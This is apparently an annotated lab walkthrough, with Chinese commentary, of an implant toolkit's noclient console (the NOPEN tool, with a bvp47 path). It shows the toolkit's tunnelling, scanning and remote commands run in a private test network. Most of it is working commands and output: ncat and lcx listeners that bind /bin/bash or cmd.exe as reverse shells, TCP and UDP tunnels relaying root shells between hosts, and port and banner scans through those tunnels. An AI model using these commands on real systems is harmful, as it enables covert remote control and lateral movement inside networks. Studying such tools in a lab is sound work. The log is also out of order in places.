[03-18-22 06:49:29 GMT][localhost:12649 -> centos4x86.local.172.19.2.11:32754]
[-rawsend 6969]
noclient: waiting for connection on port 6969
noclient: waiting to receive 1684632074 byte packet
 ./ncat/ncat -lvnp 6969 -e /bin/bash
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::6969
Ncat: Listening on 0.0.0.0:6969
Ncat: Connection from 172.19.2.13.
Ncat: Connection from 172.19.2.13:58451.
-rtun 6968 172.19.2.11 6969
[03-18-22 07:08:39 GMT][localhost:12649 -> centos4x86.local.172.19.2.11:32754]
[-rtun 6968 172.19.2.11 6969]
Listening on centos4x86.local.172.19.2.11:6968 (:6968)
Connecting to 172.19.2.11:6969 (172.19.2.11:6969)
Allowing connections from anywhere
noclient: waiting for remote connection...
noclient: received connection from 172.19.2.13  [03-18-22 07:09:27 GMT]
./ncat 172.19.2.11 6968
id&&pwd&&ip a show eth0
uid=0(root) gid=0(root) 
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 
context=root:system_r:unconfined_t
/root/nmap-7.92
2: eth0:  mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 08:00:27:34:56:70 brd ff:ff:ff:ff:ff:ff
    inet 172.19.2.11/24 brd 172.19.2.255 scope global eth0
    inet6 fe80::a00:27ff:fe34:5670/64 scope link
       valid_lft forever preferred_lft forever
在noclient建立反向udp隧道。
启动nc。
这里只是显示一下命令的用法，实践中应该是多台内网设备之间的操作。
stun
监听模式的隧道。
在目标机上启动反弹shell。
在noclient上建立隧道。
./ncat/ncat -lvnu 6969 -e /bin/bash
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::6969
Ncat: Listening on 0.0.0.0:6969
Ncat: Connection from 172.19.2.13.
-rutun 6968 172.19.2.11 6969
[03-18-22 07:18:30 GMT][localhost:12649 -> centos4x86.local.172.19.2.11:32754]
[-rutun 6968 172.19.2.11 6969]
Listening on :6968 (:6968)
Sending UDP datagrams to 172.19.2.11:6969 (172.19.2.11:6969)
noclient: waiting for remote receiver...
noclient: remote receiver ready
UDP packet of size 4 received from 172.19.2.13:0 to 127.0.0.1:6969  [03-18-22 
07:20:04 GMT]
UDP packet of size 16 received locally  [03-18-22 07:20:04 GMT]
UDP packet of size 24 received from 172.19.2.13:0 to 127.0.0.1:6969  [03-18-22 
07:20:17 GMT]
UDP packet of size 420 received locally  [03-18-22 07:20:17 GMT]
./ncat -u 172.19.2.11 6968
id&&pwd&&ip a show eth0
uid=0(root) gid=0(root) 
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 
context=root:system_r:unconfined_t
/root/nmap-7.92
2: eth0:  mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 08:00:27:34:56:70 brd ff:ff:ff:ff:ff:ff
    inet 172.19.2.11/24 brd 172.19.2.255 scope global eth0
    inet6 fe80::a00:27ff:fe34:5670/64 scope link
       valid_lft forever preferred_lft forever
lcx -S netcat -lvnp 6969 -e cmd.exe
Given Option: S
netcatlistening on [any] 6969 ...
connect to [172.19.2.1] from (UNKNOWN) [172.19.2.11] 32768
在noclient上启动nc。
这样就把一台windows机器的shell反弹到noclient的本地端口上了。
这个命令的使用方法 Usage: -stun toip toport [localport [srcport [srcip]]]
也就是支持srcport， srcip，如果使用ew，socat，chisel等隧道工具，可以建立一个本地监听的端口，
可以将远端的数据库等服务的端口映射到本地，然后进行操作。
sutun
这个命令与stun一样，只是协议修改为udp。
在目标机上启动nc。
在noclient上建立隧道。
-stun
[03-18-22 23:24:34 GMT][localhost:30240 -> centos4x86.local.172.19.2.11:32754]
[-stun]
Usage: -stun toip toport [localport [srcport [srcip]]]
NO! centos4x86.local:/root/bvp47>-stun 172.19.2.1 6969
[03-19-22 00:05:40 GMT][localhost:30240 -> centos4x86.local.172.19.2.11:32754]
[-stun 172.19.2.1 6969]
Listening on localhost:6969 (127.0.0.1:6969)
Connecting to 172.19.2.1:6969 (172.19.2.1:6969)
Anoclient: received local connection, contacting server
noclient: peer address is 172.19.2.1  [03-19-22 00:06:02 GMT]
./ncat localhost 6969
Microsoft Windows [汾 10.0.19043.1526]
(c) Microsoft CorporationȨ
COMMANDO 2022/03/19   8:06:04.16
D:\ht\lcx\win>
./ncat -lvnu 6969 -e /bin/bash
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on 0.0.0.0:6969
Ncat: Connection from 172.19.2.11.
-sutun 172.19.2.11 6969 6968
[03-19-22 00:17:08 GMT][localhost:30240 -> centos4x86.local.172.19.2.11:32754]
[-sutun 172.19.2.11 6969 6968]
Listening on localhost:6968 (127.0.0.1:6968)
Sending UDP datagrams to 172.19.2.11:6969 (172.19.2.11:6969)
noclient: waiting for remote transmitter...
noclient: remote transmitter ready
UDP packet of size 3 received locally  [03-19-22 00:17:19 GMT]
UDP packet of size 697 received from 172.19.2.11:0 to 172.19.2.11:44902  [03-19-
22 00:17:19 GMT]
UDP packet of size 82 received locally  [03-19-22 00:18:34 GMT]
UDP packet of size 24 received locally  [03-19-22 00:18:47 GMT]
UDP packet of size 425 received from 172.19.2.11:0 to 172.19.2.11:44902  [03-19-
22 00:18:47 GMT]
在noclient上运行nc。
scan
隧道经常和扫描工具一起使用，这个工具也一样。
扫描端口，这个需要配套的scanner程序。
在命令行执行一下scanner，学习一下这个扫描器如何运行。
./ncat -u localhost 6968
id&&pwd&&ip a show eth0
uid=0(root) gid=0(root) 
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 
context=root:system_r:unconfined_t
/root/nmap-7.92/ncat
2: eth0:  mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 08:00:27:34:56:70 brd ff:ff:ff:ff:ff:ff
    inet 172.19.2.11/24 brd 172.19.2.255 scope global eth0
    inet6 fe80::a00:27ff:fe34:5670/64 scope link
       valid_lft forever preferred_lft forever
-scan 22 172.19.2.13
[03-17-22 07:27:02 GMT][localhost:19360 -> centos4x86.local.172.19.2.11:32754]
[-scan 22 172.19.2.13]
Waiting for NOPEN tunnels to be ready...
Listening on localhost:61615 (127.0.0.1:61615)
Connecting to 172.19.2.13:22 (172.19.2.13:22)
sh: line 1: /current/down/cmdout/scans: No such file or directory
Scanning port 22
scanning i is  127.0.0.1
Scan TCP port
connect to 127.0.0.1
---------------
SSH-2.0-OpenSSH_4.3
scanner
Usage: scanner typeofscan IP_address
  Scan options:
        winl   Scan for windows boxes
        winn   Scan for windows names
        xwin   Scan for Xwin folks
        time   Scan for NTP  folks
         rpc   Scan for RPC  folks
       snmp1   Scan for SNMP version
       snmp2   Scan for Sol  version
        echo   Scan for echo hosts
       time2   Scan for daytime hosts
        tftp   Scan for tftp hosts
        tday   Scan for daytime hosts
       ident   Scan ident
        mail   Scan mail
         ftp   Scan ftp
     t_basic   Scan TCP port
        http   Scan web
     netbios   Does not work
这个扫描器有常见的扫描功能。
简单操作一下。
这里的结果与noclient的结果一致。
vscan
vscan是先建立通道，然后进行扫描。jscan也是一个扫描程序。木有找到对应的程序。
远程网络命令
主要是网络状态操作的命令。
icmptime
         dns   Scan for DNS
       ripv1   Scan for RIP v1
       ripv2   Scan for RIP v2
         lpr   Scan for lpr
    miniserv   Scan for Redflag Web
    win_scan   Get windows version
      telnet   Banner Telnet
      finger   Banner finger
         ssl   Scan for SSL stuff
         ssh   Scan for SSH version
       snmp3   Finnish Test Case SNMP
     dtuname   DT uname test
           #   port other than above
         all   (you are really cool)
        sane   (you are really smart, all - snmp1 and snmp2)
You are the weakest link, goodbye
scanner ssh 172.19.2.13
scanning i is  172.19.2.13
Scan for SSH version
connect to 172.19.2.13
---------------
SSH-2.0-OpenSSH_4.3
--
---------------
adios
-vscan 22 172.19.2.11
[03-17-22 07:29:58 GMT][localhost:19360 -> centos4x86.local.172.19.2.11:32754]
[-vscan 22 172.19.2.11]
Setting up tunnel on port 17779
Running: jscan -ri 127.0.0.1 -rc 17779 -rs 172.19.2.11 &
sh: jscan: command not found
Starting NOPEN -tunnel...
Setting up a UDP tunnel mechanism on port 17779
利用mkoffset脚本计算icmp的时间查。
ifconfig
显示网卡信息。
nslookup
这里需要注意的是name server的设置。
ping trace
-icmptime 172.19.2.1
[03-19-22 02:03:48 GMT][localhost:30240 -> centos4x86.local.172.19.2.11:32754]
[-icmptime 172.19.2.1]
 Timestamp reply        172.19.2.1 >       172.19.2.11 (TTL 128)
Send    Timestamp: 02:03:48 UTC
Receive Timestamp: 812:39:15 UTC     for (172.19.2.1)
Assuming AHEAD  one day:   Sun Mar 20 12:39:15 UTC 2022   UTC_OFFSET=2075
Assuming TODAY's   date:   Sat Mar 19 12:39:15 UTC 2022   UTC_OFFSET=635
Assuming BEHIND one day:   Fri Mar 18 12:39:15 UTC 2022   UTC_OFFSET=-804
-ifconfig
[03-19-22 02:06:26 GMT][localhost:30240 -> centos4x86.local.172.19.2.11:32754]
[-ifconfig]
lo:  flags= mtu 16436
inet 127.0.0.1 broadcast 127.255.255.255 netmask 255.0.0.0
inet6 ::1/128
ether 00:00:00:00:00:00
eth0:  flags= mtu 1500
inet 172.19.2.11 broadcast 172.19.2.255 netmask 255.255.255.0
inet6 fe80:0:a00:27ff::fe34:5670/64
ether 08:00:27:34:56:70
>-nslookup nsa.org
[03-19-22 02:07:46 GMT][localhost:47388 -> centos4x86.local.172.19.2.11:32754]
[-nslookup nsa.org]
Primary Server: 0.0.0.0#53
resolver error for host nsa.org: Temporary failure in name resolution
远程服务端命令
控制服务端的退出，信息，监听和调用。
pid
listen
启动一个新实例，并监听在指定端口上。客户端就可以连接到指定端口了。
客户端也可以运行在监听端口上，然后由服务端反向连接过来。
call
-ping 172.19.2.1
[03-19-22 02:10:23 GMT][localhost:47388 -> centos4x86.local.172.19.2.11:32754]
[-ping 172.19.2.1]
 ICMP Reply (172.19.2.1)   0.168 ms        172.19.2.1 >       172.19.2.11 (TTL 
128)
-trace 172.19.2.1
[03-19-22 02:10:04 GMT][localhost:47388 -> centos4x86.local.172.19.2.11:32754]
[-trace 172.19.2.1]
traceroute to 172.19.2.1 (using 172.19.2.11), 30 hops max, 38 byte packets
 1  (172.19.2.1)   0.197 ms  0.178 ms  0.143 ms
-pid
[03-17-22 03:48:32 GMT][localhost:21655 -> centos4x86.local.172.19.2.11:32754]
[-pid]